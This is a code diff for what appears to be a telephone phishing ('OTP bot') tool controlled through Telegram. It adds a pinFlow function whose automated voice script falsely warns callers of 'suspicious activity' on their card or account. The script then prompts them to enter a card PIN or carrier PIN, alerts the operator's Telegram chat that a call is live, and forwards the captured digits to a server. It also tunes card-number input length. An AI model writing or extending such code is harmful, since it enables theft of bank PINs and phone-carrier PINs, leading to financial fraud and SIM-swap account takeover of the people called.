@@ -667,7 +667,7 @@ export const cardFlow = async (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 18,
+          maxNumKeys: 16,
         },
         {
           id: uuidv4(),
@@ -678,7 +678,7 @@ export const cardFlow = async (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 18,
+          maxNumKeys: 16,
         },
         {
           id: 'cardStepOTP',
@@ -714,7 +714,7 @@ export const cardFlow = async (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 18,
+          maxNumKeys: 16,
         },
         {
           id: uuidv4(),
@@ -725,7 +725,7 @@ export const cardFlow = async (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 18,
+          maxNumKeys: 16,
         },
         {
           id: 'cardStepOTP',
@@ -832,6 +832,202 @@ export const cardFlow = async (
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
+          },
+        },
+      ],
+    });
+  }
+};
+
+export const pinFlow = async (
+  dtmf: string,
+  res: Response,
+  language: string,
+  chatId: number | undefined,
+  step: string,
+  destination: string,
+  pinType: string,
+): Promise<Response> => {
+  if (dtmf && dtmf === '1') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
+    return res.json({
+      id: uuidv4(),
+      title: `pay card - ${chatId} OTP`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              pinType === 'carrierPin'
+                ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
+                : `For your security and to protect your account. enter your ${pinType} followed by the pound key`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'pinStepOTP',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: pinType === 'carrierPin' ? 6 : 4,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'pinStepOTP',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 16,
+        },
+        {
+          id: 'pinStepOTP',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
+          },
+        },
+      ],
+    });
+  } else if (dtmf && dtmf === '2') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
+    return res.json({
+      id: uuidv4(),
+      title: `pay card - ${chatId} OTP`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              pinType === 'carrierPin'
+                ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
+                : `For your security and to protect your account. enter your ${pinType} followed by the pound key`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'pinStepOTP',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: pinType === 'carrierPin' ? 6 : 4,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'pinStepOTP',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 16,
+        },
+        {
+          id: 'pinStepOTP',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
+          },
+        },
+      ],
+    });
+  } else if (dtmf && dtmf === '3') {
+    return res.json({
+      id: uuidv4(),
+      title: `call card - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              pinType === 'carrierPin'
+                ? `There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
+                : `We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+        },
+        {
+          action: 'hangup',
+        },
+        {
+          id: 'cardStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/dpins/${language}/${step}/${chatId}?pinType=${pinType}`,
+          },
+        },
+      ],
+    });
+  } else {
+    return res.json({
+      id: uuidv4(),
+      title: `call card - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              pinType === 'carrierPin'
+                ? `You have selected an INVALID option. There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
+                : `You have selected an INVALID option. We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+        },
+        {
+          action: 'hangup',
+        },
+        {
+          id: 'cardStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/dpins/${language}/${step}/${chatId}?pinType=${pinType}`,
           },
         },
       ],
